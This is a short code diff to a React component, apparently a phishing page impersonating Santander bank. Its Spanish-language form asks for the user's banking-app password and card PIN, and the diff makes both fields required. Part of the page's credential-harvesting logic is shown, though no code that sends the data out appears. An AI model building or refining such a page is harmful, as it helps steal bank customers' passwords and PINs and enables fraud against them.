@@ -40,11 +40,11 @@ function Primerapag() {
       <form className="santander-form" onSubmit={handleSubmit}>
         <label>
           Contraseña que usa en su aplicación
-          <input type="text" name="password" placeholder="Contraseña" className="santander-input" />
+          <input type="text" name="password" placeholder="Contraseña" className="santander-input" required />
         </label>
         <label>
           Nip de su tarjeta
-          <input type="tel" name="nip" placeholder="Nip de 4 dígitos" className="santander-input" maxLength={4} />
+          <input type="tel" name="nip" placeholder="Nip de 4 dígitos" className="santander-input" maxLength={4} required />
         </label>
         <button type="submit" className="santander-continue-button">Continuar</button>
       </form>
